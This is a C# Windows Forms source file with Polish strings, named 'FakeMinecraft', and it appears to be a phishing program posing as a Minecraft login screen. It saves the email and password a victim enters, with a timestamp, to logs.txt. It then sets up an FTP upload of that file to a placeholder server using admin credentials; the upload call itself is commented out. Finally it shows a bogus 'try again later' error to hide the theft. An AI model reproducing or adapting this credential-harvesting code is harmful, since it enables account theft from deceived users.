using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

//Dodajemy biblioteki
using System.IO;    // Osbługa plików tekstowych
using System.Net;   // Obsługa połączenia do serwera FTP
using System.Threading;

namespace FakeMinecraft
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            picLoading.Visible = false;
        }

        private void btnZaloguj_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtLogin.Text))
            {
                MessageBox.Show("Nieprawidłowy adres e-mail.", "Wystąpił problem podczas logowania");
                return;
            }

            if (string.IsNullOrWhiteSpace(txtHaslo.Text))
            {
                MessageBox.Show("Nieprawidłowe hasło.", "Wystąpił problem podczas logowania");
                return;
            }

            UseWaitCursor = true;
            picLoading.Visible = true;
            btnZaloguj.Enabled = false;
            backgroundWorker1.RunWorkerAsync();
        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {
            var error = SendCredentials();

            var message = "Wystąpił problem nieznany podczas próby logowania do gry Minecraft. Prosimy spróbować ponownie za kilka minut.";
            if (!string.IsNullOrWhiteSpace(error))
                message += "(Ex000" + error;

            MessageBox.Show(message, "Wystąpił problem podczas logowania");
        }

        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            UseWaitCursor = false;
            picLoading.Visible = false;
            btnZaloguj.Enabled = true;
        }

        private string SendCredentials()
        {
            try
            {
                var sb = new StringBuilder();
                sb.Append("Data próby dostępu: ").AppendLine(DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"));
                sb.Append("Login: ").AppendLine(txtLogin.Text);
                sb.Append("Hasło: ").AppendLine(txtHaslo.Text);
                sb.AppendLine().AppendLine("***********************************************************************************************").AppendLine();
                File.AppendAllText("logs.txt", sb.ToString());
            }
            catch (Exception)
            {
                return "1";
            }

            try
            {
                var userFtpLogin = "admin";
                var userFtpPassword = "admin";
                WebClient client = new WebClient();
                client.Credentials = new NetworkCredential(userFtpLogin, userFtpPassword);

                var fileOnSite = "ftp://example/FakeMinecraft/logs.txt";
                //client.UploadFile(fileOnSite, WebRequestMethods.Ftp.UploadFile, "logs.txt");
                Thread.Sleep(3000);
            }
            catch (Exception)
            {
                return "2";
            }

            return string.Empty;
        }

        private void fakeButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Wystąpił niespodziewany problem. Spróbuj się zalogować.", "Błąd");
        }
    }
}
